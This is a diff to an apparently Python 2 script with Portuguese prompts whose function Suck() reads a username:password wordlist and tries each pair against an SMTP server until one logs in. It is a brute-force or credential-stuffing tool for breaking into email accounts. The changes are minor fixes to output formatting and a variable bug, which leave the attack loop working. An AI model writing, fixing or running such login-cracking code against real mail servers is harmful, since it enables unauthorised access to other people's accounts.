@@ -147,16 +147,17 @@ def Suck():
   smptserver.starttls()
   try:
     WordList = raw_input(azul + "💉 Digite o Nome da sua Wordlist.txt: ")
+    print('')
     var = open(WordList, 'r').readlines()
     for line in var:
       line = line.strip()
       USERNAME, PASSWORD = line.split(":")
       try:
         smptserver.login(USERNAME, PASSWORD)
-        print verde +"[+] Login Activated:\n %s" % line
+        print verde +"[+] Login Activated: %s" % line, "\n"
         break;
       except smtplib.SMTPAuthenticationError:
-        print vermelho + "[!] password Incorrect: %s" % password
+        print vermelho + "[!] password Incorrect: %s" % line,"\n"
   except KeyboardInterrupt:
     print vermelho + "[404] Error Keyboard Interrupt Not Found....[!/.]"      
 if options == '1':
@@ -164,4 +165,4 @@ if options == '1':
 elif options == '2':
   Suck()
 else:
-  print "Escolha uma opção Valida..[!/.]"
+  print vermelho + "Escolha uma opção Valida..[!/.]"
